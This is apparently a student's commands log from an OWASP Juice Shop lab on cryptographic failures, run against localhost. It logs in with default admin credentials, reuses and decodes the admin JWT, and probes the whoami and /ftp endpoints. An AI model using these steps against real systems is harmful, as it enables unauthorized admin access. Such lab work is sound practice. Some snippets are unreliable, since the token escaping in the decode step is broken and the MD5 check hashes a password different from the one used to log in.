# Commands Log — OWASP A02: Cryptographic Failures (Juice Shop)

## Setup
cd ~/Alrazzaq_Labs/OWASP-Top-10
mkdir -p 02-Cryptographic-Failures/raw-output 02-Cryptographic-Failures/screenshots
cd 02-Cryptographic-Failures
touch README.md commands.md findings.md methodology.md remediation.md

## Finding 1: Default admin credentials accepted
curl -s http://localhost:3000/rest/user/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@juice-sh.op","password":"admin123"}' \
  -o raw-output/admin_login.json

export ADMIN_TOKEN=$(cat raw-output/admin_login.json | python3 -c "import sys,json; print(json.load(sys.stdin)['authentication']['token'])")

## Finding 2: JWT decode — confirm role=admin and exposed password hash
python3 -c "
import base64, json
payload = '\$ADMIN_TOKEN'.split('.')[1]
payload += '=' * (-len(payload) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(payload)), indent=2))
" | tee raw-output/admin_jwt_decoded.json

## Finding 3: Unsalted MD5 proof
echo -n 'Passw0rd!' | md5sum
echo "Stored hash from JWT payload: 47b7bfb65fa83ac9a71dcb0f6296bb6e"

## Supporting check: whoami endpoint exposure
curl -s http://localhost:3000/rest/user/whoami \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -o raw-output/whoami_admin.json

## Supporting check: exposed /ftp directory
curl -s http://localhost:3000/ftp -o raw-output/ftp_listing.html
